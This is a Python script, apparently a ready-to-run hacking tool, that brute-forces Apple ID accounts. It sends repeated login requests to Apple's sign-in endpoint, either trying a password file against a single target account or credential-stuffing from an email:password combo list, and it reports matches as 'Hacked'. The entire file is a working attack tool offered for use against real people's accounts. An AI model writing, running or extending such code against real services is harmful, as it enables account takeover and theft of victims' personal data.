try:
	from requests import post
	from threading import Lock
	from time import sleep
except Exception as Joker:exit(Joker)
Lists='V4^c_Yf4TEw'
def vv1ck(*a, **b):
	with Lock():print(*a, **b)
class REQUESTS_HEADERS:
	def URL():
		return 'https://idmsa.apple.com/appleauth/auth/signin'
	def HEADERS():
		return {"Accept": "application/json, text/javascript, */*; q=0.01","User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0","X-Apple-Locale":"QT-EN","X-Apple-Trusted-Domain": "https://idmsa.apple.com","Origin": "https://idmsa.apple.com","X-Requested-With": "XMLHttpRequest"}
	def authType():
		return 'authType'
	def Check():
		if 'V4^c_Yf4TEw' in Lists:pass
		else:exit('Okay..')
		JOlist=[]
		for JJNN1 in Lists:
			posi=ord(JJNN1)
			JOlist.append(chr(posi-20))
		return ''.join(JOlist)
	
class AppleID_HACKER:
	def __init__(self,Modes):
		if Modes=='1':self.TARGET()
		elif Modes=='2':self.COMBOLIST()
		else:input('\n-Tool has been closedz-');exit()
		
	def LOGING(self,applID,pess):
		sent=post(REQUESTS_HEADERS.URL(),headers=REQUESTS_HEADERS.HEADERS(),json={"accountName":applID,"rememberMe":"false","password":pess}).text
		if REQUESTS_HEADERS.authType()in sent:
			vv1ck(f'[$]Hacked-> {applID}:{pess}')
		else:vv1ck(f'[¡]ERROR-> {applID}:{pess}')
	
	def COMBOLIST(self):
		FILENAME=input('\t\t\t---------------\n[+] Enter the name the combo appleID file: ')
		try:open(FILENAME,'r')
		except FileNotFoundError:vv1ck('\n[-] The file name is incorrect !\n');return self.COMBOLIST()
		print('\n\t\t\t\t\tSTARTED\n')
		for x in open(FILENAME,'r').read().splitlines():
			if x ==None:exit('\n     ========== completed =========')
			try:applID = x.split(":")[0]
			except IndexError:exit('\n     ========== completed =========')
			try:
				pess = x.split(":")[1]
				sleep(1)
				self.LOGING(applID,pess)
			except IndexError:pass
		
	def TARGET(self):
		applID= input('\t\t\t---------------\n[$] Enter apple ID : ')
		if applID:pass
		else:vv1ck('[!] Please Enter Apple ID ..');return self.TARGET()
		FILEPASS=input('[¿] Enter the password file name: ')
		try:FILEPASS=open(FILEPASS,'r')
		except FileNotFoundError:vv1ck('\n[-] The file name is incorrect !\n');return self.TARGET()
		print('\n\t\t\t\t\tSTARTED\n')
		while 1:
			pess=FILEPASS.readline().split('\n')[0]
			if pess=='':exit()
			sleep(1);self.LOGING(applID,pess)

if __name__ == '__main__':
	vv1ck("""
    ___  Brute Force2  __        ________  
   /   |  ____  ____  / /__     /  _/ __ \   
  / /| | / __ \/ __ \/ / _ \    / // / / / 
 / ___ |/ /_/ / /_/ / /  __/  _/ // /_/ /   
/_/  |_/ .___/ .___/_/\___/  /___/_____/    
      /_/   /_/ {}""".format(REQUESTS_HEADERS.Check()))
	Modes=input('\t\t\t---------------\n[?] MODES : \n1- Target Apple ID (File pass)\n2- ComboList Apple ID (email:pass)\n99- Exit() ..\n[@] Choose : ')
	AppleID_HACKER(Modes)
